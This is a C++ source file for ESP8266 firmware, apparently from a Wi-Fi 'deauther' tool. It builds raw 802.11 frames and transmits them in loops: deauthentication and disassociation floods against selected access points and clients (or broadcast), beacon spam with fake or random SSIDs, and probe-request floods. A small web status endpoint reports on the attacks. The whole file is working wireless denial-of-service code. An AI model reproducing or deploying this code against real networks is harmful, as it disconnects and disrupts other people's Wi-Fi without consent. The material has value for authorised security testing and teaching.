#include "Attack.h"

Attack::Attack() {
}

void Attack::generate() {
  if (debug) Serial.print("\n generating MACs...");

  Mac _randomBeaconMac;
  uint8_t _randomMacBuffer[6];
  beaconAdrs._clear();

  for (int i = 0; i < macListLen; i++) channels[i] = random(1, maxChannel);
  do {
    _randomBeaconMac.randomize();
  } while (beaconAdrs.add(_randomBeaconMac) >= 0);
  if (debug) Serial.println("done");

  macListChangeCounter = 0;
}

void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason) {
  packetSize = 0;
  for (int i = 0; i < sizeof(deauthPacket); i++) {
    packet[i] = deauthPacket[i];
    packetSize++;
  }

  for (int i = 0; i < 6; i++) {
    //set target (client)
    packet[4 + i] = _client._get(i);
    //set source (AP)
    packet[10 + i] = packet[16 + i] = _ap._get(i);
  }

  //set type
  packet[0] = type;
  packet[24] = reason;
}

void Attack::buildBeacon(Mac _ap, String _ssid, int _ch, bool encrypt) {
  packetSize = 0;
  int ssidLen = _ssid.length();
  if (ssidLen > 32) ssidLen = 32;

  for (int i = 0; i < sizeof(beaconPacket_header); i++) {
    packet[i] = beaconPacket_header[i];
    packetSize++;
  }

  if(settings.beaconInterval){
    beaconPacket_header[32] = 0xe8;
    beaconPacket_header[33] = 0x03;
  }

  for (int i = 0; i < 6; i++) {
    //set source (AP)
    packet[10 + i] = packet[16 + i] = _ap._get(i);
  }

  packet[packetSize] = 0x00;
  packetSize++;
  packet[packetSize] = ssidLen;
  packetSize++;

  for (int i = 0; i < ssidLen; i++) {
    packet[packetSize] = _ssid[i];
    packetSize++;
  }

  for (int i = 0; i < sizeof(beaconPacket_end); i++) {
    packet[packetSize] = beaconPacket_end[i];
    packetSize++;
  }

  packet[packetSize] = _ch;
  packetSize++;

  if (encrypt) {
    for (int i = 0; i < sizeof(beaconWPA2tag); i++) {
      packet[packetSize] = beaconWPA2tag[i];
      packetSize++;
    }
  }

}

void Attack::buildProbe(String _ssid, Mac _mac) {
  int len = _ssid.length();
  if (len > 32) len = 32;
  packetSize = 0;

  for (int i = 0; i < sizeof(probePacket); i++) packet[packetSize + i] = probePacket[i];
  packetSize += sizeof(probePacket);

  for (int i = 0; i < 6; i++) packet[10 + i] = _mac._get(i);

  packet[packetSize] = len;
  packetSize++;

  for (int i = 0; i < len; i++) packet[packetSize + i] = _ssid[i];
  packetSize += len;

  for (int i = 0; i < sizeof(probePacket_RateTag); i++) packet[packetSize + i] = probePacket_RateTag[i];
  packetSize += sizeof(probePacket_RateTag);
}

bool Attack::send() {
  if (wifi_send_pkt_freedom(packet, packetSize, 0) == -1) {
    /*
      if(debug){
      Serial.print(packetSize);
      Serial.print(" : ");
      PrintHex8(packet, packetSize);
      Serial.println("");
      }
    */
    return false;
  }
  delay(1); //less packets are beeing dropped
  return true;
}

void Attack::changeRandom(int num){
  randomMode = !randomMode;
  randomInterval = num;
  if(debug) Serial.println("changing randomMode: " + (String)randomMode);
  if(randomMode){
    if(debug) Serial.println(" generate random SSIDs");
    ssidList.clear();
    ssidList._random();
    randomCounter = 0;
    ssidChange = true;
  }
}

void Attack::sendDeauths(Mac from, Mac to){
  for(int i=0;i<settings.attackPacketRate;i++){
    buildDeauth(from, to, 0xc0, settings.deauthReason );
    if(send()) packetsCounter[0]++;
    buildDeauth(from, to, 0xa0, settings.deauthReason );
    send();
    buildDeauth(to, from, 0xc0, settings.deauthReason );
    send();
    buildDeauth(to, from, 0xa0, settings.deauthReason );
    send();
    delay(5);
  }
}

void Attack::run() {
  unsigned long currentMillis = millis();

  /* =============== Deauth Attack =============== */
  if (isRunning[0] && currentMillis - prevTime[0] >= 1000) {
    if (debug) Serial.print("running " + (String)attackNames[0] + " attack...");
    prevTime[0] = millis();

    for (int a = 0; a < apScan.results; a++) {
      if (apScan.isSelected(a)) {
        Mac _ap;
        int _ch = apScan.getAPChannel(a);
        _ap.set(apScan.aps._get(a));

        wifi_set_channel(_ch);

        int _selectedClients = 0;
        
        for (int i = 0; i < clientScan.results; i++) {
          if (clientScan.getClientSelected(i)) {
            _selectedClients++;
            /*if (settings.channelHop) {
              for (int j = 1; j < maxChannel; j++) {
                wifi_set_channel(j);

                buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
                if (send()) packetsCounter[0]++;

                buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
                if (send()) packetsCounter[0]++;
              }
            } else {*/
              sendDeauths(_ap, clientScan.getClientMac(i));
            //}
          }
        }

        if (_selectedClients == 0) {
          Mac _client;
          _client.set(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF);
          sendDeauths(_ap, _client);
        }

      }
    }

    stati[0] = (String)packetsCounter[0] + "pkts/s";
    packetsCounter[0] = 0;
    if (debug) Serial.println(" done");
    if (settings.attackTimeout > 0) {
      attackTimeoutCounter[0]++;
      if (attackTimeoutCounter[0] > settings.attackTimeout) stop(0);
    }
  }

  /* =============== Beacon Attack =============== */
  int beaconsPerSecond = 10;
  if(settings.beaconInterval) beaconsPerSecond = 1;
  if (isRunning[1] && currentMillis - prevTime[1] >= 1000/beaconsPerSecond) {
    if (debug) Serial.print("running " + (String)attackNames[1] + " attack...");
    prevTime[1] = millis();

    for (int a = 0; a < ssidList.len; a++) {
      buildBeacon(beaconAdrs._get(a), ssidList.get(a), channels[a], ssidList.isEncrypted(a));
      if (send()) packetsCounter[1]++;
    }

    stati[1] = (String)(packetsCounter[1] * beaconsPerSecond) + "pkts/s";
    packetsCounter[1] = 0;
    
    macListChangeCounter++;
    if(settings.macInterval > 0){
      if (macListChangeCounter / beaconsPerSecond >= settings.macInterval) generate();
    }
    
    if (debug) Serial.println(" done");
    if (settings.attackTimeout > 0) {
      attackTimeoutCounter[1]++;
      if (attackTimeoutCounter[1] / beaconsPerSecond > settings.attackTimeout) stop(1);
    }
  }

  /* =============== Probe Request Attack =============== */
  if (isRunning[2] && currentMillis - prevTime[2] >= 1000) {
    if (debug) Serial.print("running " + (String)attackNames[2] + " attack...");
    prevTime[2] = millis();

    for (int a = 0; a < ssidList.len; a++) {
      buildProbe(ssidList.get(a), beaconAdrs._get(a));
      if(send()) packetsCounter[2]++;
      if(send()) packetsCounter[2]++;
    }

    stati[2] = (String)(packetsCounter[2]) + "pkts/s";
    packetsCounter[2] = 0;

    macListChangeCounter++;
    if(settings.macInterval > 0){
      if (macListChangeCounter >= settings.macInterval) generate();
    }
    
    if (debug) Serial.println("done");
    if (settings.attackTimeout > 0) {
      attackTimeoutCounter[2]++;
      if (attackTimeoutCounter[2] > settings.attackTimeout) stop(2);
    }
  }

  //Random-Mode Interval
  if((isRunning[1] || isRunning[2]) && randomMode && currentMillis - randomTime >= 1000){
    randomTime = millis();
    if(randomCounter >= randomInterval){
      if(debug) Serial.println(" generate random SSIDs");
      ssidList.clear();
      ssidList._random();
      randomCounter = 0;
      ssidChange = true;
    }
    else randomCounter++;
  }
  
}

void Attack::start(int num) {
  Serial.println(num);
  if(!isRunning[num]) {
    Serial.println(num);
    isRunning[num] = true;
    stati[num] = "starting";
    prevTime[num] = millis();_log(num);
    attackTimeoutCounter[num] = 0;
    refreshLed();
    if (debug) Serial.println("starting " + (String)attackNames[num] + " attack...");
    if (num == 0) attackMode_deauth = "STOP";
    else if(num == 1) attackMode_beacon = "STOP";
    if(!settings.multiAttacks){
      for (int i = 0; i < attacksNum; i++){
        if(i != num) stop(i);
      }
    }
  }else stop(num);
}

void Attack::stop(int num) {
  if(isRunning[num]) {
    if (debug) Serial.println("stopping " + (String)attackNames[num] + " attack...");
    if (num == 0) attackMode_deauth = "START";
    else if(num == 1) attackMode_beacon = "START";
    isRunning[num] = false;
    prevTime[num] = millis();
    refreshLed();
  }
  stati[num] = "ready";
}

void Attack::stopAll() {
  for (int i = 0; i < attacksNum; i++) stop(i);
}

void Attack::_log(int num){
  openLog();
  addLog((String)attackNames[num]);
  for(int a=0;a<apScan.results;a++){
    if(apScan.isSelected(a)){
      Mac _ap;
      _ap.set(apScan.aps._get(a));
      addLog(_ap.toString());
    }
  }
  addLog("-");
  for(int i=0;i<clientScan.results; i++) {
    if(clientScan.getClientSelected(i)) {
      addLog(clientScan.getClientMac(i).toString());
    }
  }
  closeLog();
}

size_t Attack::getSize(){
  if(apScan.selectedSum == 0) stati[0] = "no AP";
  
  size_t jsonSize = 0;
  
  String json = "{\"aps\":[";
  
  int _selected = 0;
  for (int i = 0; i < apScan.results; i++) {
    if (apScan.isSelected(i)) {
      json += "\"" + apScan.getAPName(i) + "\",";
      _selected++;
    }
  }
  if (_selected > 0) json.remove(json.length() - 1);

  jsonSize += json.length();
  
  json = "],\"clients\":[";

  _selected = 0;
  for (int i = 0; i < clientScan.results; i++) {
    if (clientScan.getClientSelected(i)) {
      json += "\"" + clientScan.getClientMac(i).toString() + " " + clientScan.getClientVendor(i) + " - " + clientScan.getClientName(i) + "\",";
      _selected++;
    }
  }
  if (_selected == 0) json += "\"FF:FF:FF:FF:FF:FF - BROADCAST\"";
  else json.remove(json.length() - 1);

  jsonSize += json.length();

  json = "],\"attacks\":[";
  for (int i = 0; i < attacksNum; i++) {
    json += "{";
    json += "\"name\":\"" + attackNames[i] + "\",";
    json += "\"status\":\"" + stati[i] + "\",";
    json += "\"running\":" + (String)isRunning[i] + "";
    json += "}";
    if (i != attacksNum - 1) json += ",";
  }
  json += "],";
  jsonSize += json.length();

  if(ssidChange){
    json = "\"ssid\":[";
    jsonSize += json.length();
    for (int i = 0; i < ssidList.len; i++) {
      json = "[";
      json += "\"" + ssidList.get(i) + "\",";
      json += String( ssidList.isEncrypted(i) ) + "";
      Serial.print(ssidList.isEncrypted(i));
      json += "]";
      if (i != ssidList.len - 1) json += ",";
      jsonSize += json.length();
    }
    json = "],";
    jsonSize += json.length();
  }
  json = "\"randomMode\":" + (String)randomMode + "}";
  jsonSize += json.length();

  return jsonSize;
}

void Attack::sendResults(){
  size_t _size = getSize();
  if (debug) Serial.print("getting attacks JSON ("+(String)_size+")...");
  sendHeader(200, "text/json", _size);

  String json = "{\"aps\":[";
  
  int _selected = 0;
  for (int i = 0; i < apScan.results; i++) {
    if (apScan.isSelected(i)) {
      json += "\"" + apScan.getAPName(i) + "\",";
      _selected++;
    }
  }
  if (_selected > 0) json.remove(json.length() - 1);
  sendToBuffer(json);

  
  json = "],\"clients\":[";

  _selected = 0;
  for (int i = 0; i < clientScan.results; i++) {
    if (clientScan.getClientSelected(i)) {
      json += "\"" + clientScan.getClientMac(i).toString() + " " + clientScan.getClientVendor(i) + " - " + clientScan.getClientName(i) + "\",";
      _selected++;
    }
  }
  if (_selected == 0) json += "\"FF:FF:FF:FF:FF:FF - BROADCAST\"";
  else json.remove(json.length() - 1);

  sendToBuffer(json);

  json = "],\"attacks\":[";
  for (int i = 0; i < attacksNum; i++) {
    json += "{";
    json += "\"name\":\"" + attackNames[i] + "\",";
    json += "\"status\":\"" + stati[i] + "\",";
    json += "\"running\":" + (String)isRunning[i] + "";
    json += "}";
    if (i != attacksNum - 1) json += ",";
  }
  json += "],";
  sendToBuffer(json);
  
  if(ssidChange){
    json = "\"ssid\":[";
    sendToBuffer(json);
    for (int i = 0; i < ssidList.len; i++) {
      json = "[";
      json += "\"" + ssidList.get(i) + "\",";
      json += (String)ssidList.isEncrypted(i) + "";
      json += "]";
      if (i != ssidList.len - 1) json += ",";
      sendToBuffer(json);
    }
    json = "],";
    sendToBuffer(json);
    ssidChange = false;
  }
  
  json = "\"randomMode\":" + (String)randomMode + "}";
  sendToBuffer(json);
  
  sendBuffer();
  if (debug) Serial.println("done");
}

void Attack::refreshLed() {
  int numberRunning = 0;
  for (int i = 0; i < sizeof(isRunning); i++) {
    if (isRunning[i]) numberRunning++;
    //if(debug) Serial.println(numberRunning);
  }
  if (numberRunning >= 1 && settings.useLed) {
    if (debug) Serial.println("Attack LED : ON");
    digitalWrite(settings.ledPin, !settings.pinStateOff);
  }
  else if (numberRunning == 0 || !settings.useLed) {
    if (debug) Serial.println("Attack LED : OFF");
    digitalWrite(settings.ledPin, settings.pinStateOff);
  }
}

